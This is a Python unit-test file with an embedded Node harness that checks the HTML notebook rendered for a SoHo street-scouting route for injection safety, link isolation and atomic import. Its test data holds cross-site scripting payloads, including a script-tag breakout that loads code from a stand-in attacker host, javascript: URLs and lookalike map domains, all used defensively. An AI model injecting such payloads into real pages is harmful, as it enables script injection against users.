"""Security and portability checks for the generated offline notebook."""

import json
import shutil
import subprocess
import unittest
from html.parser import HTMLParser

from nyc_reference.report import render_report


class DocumentParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tags = []
        self.scripts = []
        self.script_attributes = None

    def handle_starttag(self, tag, attrs):
        attributes = dict(attrs)
        self.tags.append((tag, attributes))
        if tag == "script":
            self.script_attributes = attributes
            self.scripts.append([attributes, ""])

    def handle_data(self, data):
        if self.script_attributes is not None:
            self.scripts[-1][1] += data

    def handle_endtag(self, tag):
        if tag == "script":
            self.script_attributes = None


def sample_manifest():
    return {
        "schema_version": 1,
        "project": "SoHo scouting",
        "area": {"name": "SoHo", "bbox": [-74.01, 40.72, -73.99, 40.73]},
        "source": {
            "provider": "OpenStreetMap",
            "url": "https://www.openstreetmap.org/",
            "license": "ODbL-1.0",
            "attribution": "© OpenStreetMap contributors",
            "data_timestamp": "2026-10-09T00:00:00Z",
        },
        "spacing_m": 75,
        "stops": [{
            "id": "stop-001",
            "lat": 40.723,
            "lon": -74.0,
            "heading": 27,
            "street": "Greene Street",
            "osm_way_id": 42,
            "views": {
                direction: "https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=40.723,-74.0"
                for direction in ("forward", "left", "right", "back")
            },
            "review": {"status": "pending", "notes": "", "imagery_date": "", "checked_at": "", "source_url": ""},
        }],
    }


class ReportTests(unittest.TestCase):
    def parse(self, manifest):
        parser = DocumentParser()
        parser.feed(render_report(manifest))
        return parser

    def test_manifest_script_cannot_be_closed_by_untrusted_content(self):
        manifest = sample_manifest()
        attack = '</script><script src="https://attacker.invalid/x.js"></script><img src=x onerror=alert(1)>'
        manifest["project"] = attack
        manifest["stops"][0]["review"]["notes"] = attack + "&\u2028\u2029"
        parser = self.parse(manifest)
        self.assertEqual(len(parser.scripts), 2)
        self.assertEqual(json.loads(parser.scripts[0][1]), manifest)
        self.assertNotIn("<", parser.scripts[0][1])
        self.assertNotIn("&", parser.scripts[0][1])
        self.assertNotIn("\u2028", parser.scripts[0][1])
        self.assertNotIn("\u2029", parser.scripts[0][1])
        self.assertFalse(any(tag == "img" for tag, _ in parser.tags))

    def test_all_new_tab_links_isolate_the_opener(self):
        links = [attrs for tag, attrs in self.parse(sample_manifest()).tags if tag == "a"]
        self.assertEqual(len(links), 5)
        for link in links:
            self.assertEqual(link["target"], "_blank")
            self.assertIn("noopener", link["rel"].split())
            self.assertIn("noreferrer", link["rel"].split())

    def test_notebook_is_self_contained_and_does_not_embed_imagery(self):
        parser = self.parse(sample_manifest())
        self.assertFalse(any(tag in ("img", "iframe", "link", "object", "embed") for tag, _ in parser.tags))
        self.assertFalse(any("src" in attrs for attrs, _ in parser.scripts))
        script = parser.scripts[1][1]
        self.assertNotIn("fetch(", script)
        self.assertNotIn("XMLHttpRequest", script)
        self.assertNotIn("innerHTML", script)
        self.assertNotIn("localStorage", script)

    def test_manifest_round_trip_preserves_unicode_and_review_fields(self):
        manifest = sample_manifest()
        manifest["stops"][0]["review"]["notes"] = "Façade: café, 北, cobblestones & brass."
        parser = self.parse(manifest)
        self.assertEqual(json.loads(parser.scripts[0][1]), manifest)

    def test_nonfinite_coordinates_are_rejected(self):
        manifest = sample_manifest()
        manifest["stops"][0]["lat"] = float("nan")
        with self.assertRaises(ValueError):
            render_report(manifest)

    def test_empty_route_renders_a_valid_document(self):
        manifest = sample_manifest()
        manifest["stops"] = []
        parser = self.parse(manifest)
        self.assertEqual(json.loads(parser.scripts[0][1])["stops"], [])
        self.assertTrue(any(attrs.get("id") == "empty-state" for _, attrs in parser.tags))

    @unittest.skipUnless(shutil.which("node"), "Node is optional for browser-script runtime checks")
    def test_review_export_and_atomic_import_behavior(self):
        manifest = sample_manifest()
        manifest["stops"][0]["views"].update({
            "forward": "javascript:alert(1)",
            "left": "https://www.google.com.attacker.invalid/maps",
            "right": "https://user:password@www.google.com/maps",
        })
        second = json.loads(json.dumps(manifest["stops"][0]))
        second.update(id="stop-002", lat=40.724, osm_way_id=43, street="Broome Street")
        second["views"] = {
            "forward": "https://www.google.com/search?q=not-a-map",
            "left": "https://maps.app.goo.gl/example",
            "right": "http://maps.google.com/maps",
            "back": "https://maps.google.com/maps?layer=c",
        }
        manifest["stops"].append(second)
        parser = self.parse(manifest)
        # A small DOM harness exercises the actual shipped script without a
        # browser dependency. The notebook itself never requires Node.
        harness = r'''
const assert = require("node:assert/strict");
const vm = require("node:vm");
const input = JSON.parse(require("node:fs").readFileSync(0, "utf8"));
class Element {
  constructor(tag = "div") {
    this.tagName = tag; this.attributes = {}; this.children = [];
    this.listeners = {}; this.value = ""; this.textContent = "";
    this.hidden = false; this.disabled = false;
  }
  setAttribute(key, value) { this.attributes[key] = value; }
  removeAttribute(key) { delete this.attributes[key]; if (key === "href") delete this.href; }
  append(...children) { this.children.push(...children); }
  replaceChildren(...children) { this.children = children; }
  addEventListener(name, callback) { this.listeners[name] = callback; }
  querySelector() { return this.small || (this.small = new Element("small")); }
  remove() {}
  async click() { if (this.listeners.click) return this.listeners.click({target:this}); }
  async emit(name) { return this.listeners[name]({target:this, preventDefault(){}}); }
}
const nodes = new Map();
const get = (id) => { if (!nodes.has(id)) nodes.set(id, new Element()); return nodes.get(id); };
get("notebook-data").textContent = JSON.stringify(input.manifest);
let exportedBlob;
let downloadedName;
const NativeURL = URL;
class TestURL extends NativeURL {}
TestURL.createObjectURL = (blob) => { exportedBlob = blob; return "blob:local"; };
TestURL.revokeObjectURL = () => {};
const listeners = {};
const context = {
  URL:TestURL, Blob, setTimeout:() => {},
  document:{
    getElementById:get, body:new Element("body"),
    createElement(tag) {
      const element = new Element(tag);
      if (tag === "a") element.click = () => { downloadedName = element.download; };
      return element;
    },
  },
  window:{addEventListener(name, callback) { listeners[name] = callback; }},
};
vm.runInNewContext(input.script, context);
async function exportManifest() {
  await get("export-button").click();
  return JSON.parse(await exportedBlob.text());
}
async function importManifest(value) {
  get("import-file").files = [{size:1000, text:async () => JSON.stringify(value)}];
  await get("import-file").emit("change");
}
(async () => {
  for (const direction of ["forward", "left", "right"]) {
    assert.equal(get("view-" + direction).href, undefined);
    assert.equal(get("view-" + direction).attributes["aria-disabled"], "true");
  }
  assert.match(get("view-back").href, /^https:\/\/www\.google\.com\//);
  await get("view-back").click();
  assert.equal((await exportManifest()).stops[0].review.status, "pending");
  get("review-notes").value = "Cast-iron facade <script> is text";
  await get("review-notes").emit("input");
  assert.match(get("session-state").textContent, /Saved in this session/);
  let prevented = false;
  listeners.beforeunload({preventDefault(){ prevented = true; }});
  assert.equal(prevented, true);
  get("review-status").value = "checked";
  await get("review-status").emit("change");
  const saved = await exportManifest();
  assert.equal(saved.stops[0].review.notes, "Cast-iron facade <script> is text");
  assert.equal(saved.stops[0].review.status, "checked");
  assert.ok(saved.stops[0].review.checked_at);
  assert.equal(downloadedName, "soho-scouting-notebook.json");
  assert.equal(get("checked-count").textContent, "1");
  const previousBlob = exportedBlob;
  get("source-url").value = "https://www.google.com/search?q=not-a-map";
  await get("source-url").emit("input");
  await get("export-button").click();
  assert.equal(exportedBlob, previousBlob);
  assert.match(get("notice").textContent, /Export failed.*invalid viewer link/);
  assert.equal(get("review-notes").value, saved.stops[0].review.notes);
  get("source-url").value = "https://maps.app.goo.gl/example";
  await get("source-url").emit("input");
  assert.equal((await exportManifest()).stops[0].review.source_url, "https://maps.app.goo.gl/example");

  const maliciousImport = JSON.parse(JSON.stringify(saved));
  maliciousImport.stops[0].review.notes = "Must not partially import";
  maliciousImport.stops[1].id = maliciousImport.stops[0].id;
  await importManifest(maliciousImport);
  assert.match(get("notice").textContent, /Import failed/);
  assert.equal((await exportManifest()).stops[0].review.notes, saved.stops[0].review.notes);
  const badVersion = {...saved, schema_version:2};
  await importManifest(badVersion);
  assert.match(get("notice").textContent, /schema version 1/);
  const wrongRoute = JSON.parse(JSON.stringify(saved));
  wrongRoute.stops[0].lat = 20;
  await importManifest(wrongRoute);
  assert.match(get("notice").textContent, /do not match this route/);
  wrongRoute.stops[0].lat = saved.stops[0].lat;
  wrongRoute.stops[0].heading += 90;
  await importManifest(wrongRoute);
  assert.match(get("notice").textContent, /do not match this route/);
  const invalidLink = JSON.parse(JSON.stringify(saved));
  invalidLink.stops[0].review.notes = "Import must remain atomic";
  invalidLink.stops[1].review.source_url = "https://www.google.com:8443/maps";
  await importManifest(invalidLink);
  assert.match(get("notice").textContent, /viewer link is invalid/);
  assert.equal((await exportManifest()).stops[0].review.notes, saved.stops[0].review.notes);

  const validImport = JSON.parse(JSON.stringify(saved));
  validImport.stops[0].review.notes = "<img onerror=alert(1)> remains literal text";
  validImport.stops[0].street = "Malicious replacement street";
  validImport.stops[0].views.back = "https://attacker.invalid/";
  await importManifest(validImport);
  assert.match(get("notice").textContent, /Imported review notes/);
  assert.equal(get("review-notes").value, validImport.stops[0].review.notes);
  assert.equal(get("stop-street").textContent, "Greene Street");
  assert.match(get("view-back").href, /^https:\/\/www\.google\.com\//);
  get("review-status").value = "pending";
  await get("review-status").emit("change");
  assert.equal((await exportManifest()).stops[0].review.checked_at, "");
  await get("next").click();
  assert.equal(get("stop-street").textContent, "Broome Street");
  assert.equal(get("next").disabled, true);
  for (const direction of ["forward", "left", "right"]) {
    assert.equal(get("view-" + direction).href, undefined);
  }
  assert.match(get("view-back").href, /^https:\/\/maps\.google\.com\//);
  get("street-filter").value = "Greene Street";
  await get("street-filter").emit("change");
  assert.equal(get("visible-count").textContent, "1");
  assert.equal(get("stop-street").textContent, "Greene Street");
  assert.equal(get("review-notes").value, validImport.stops[0].review.notes);
  assert.equal(get("previous").disabled, true);
  assert.equal(get("next").disabled, true);
})().catch((error) => { console.error(error); process.exitCode = 1; });
'''
        result = subprocess.run(
            [shutil.which("node"), "-e", harness],
            input=json.dumps({"manifest": manifest, "script": parser.scripts[1][1]}),
            text=True, capture_output=True, timeout=15,
        )
        self.assertEqual(result.returncode, 0, result.stderr)


if __name__ == "__main__":
    unittest.main()
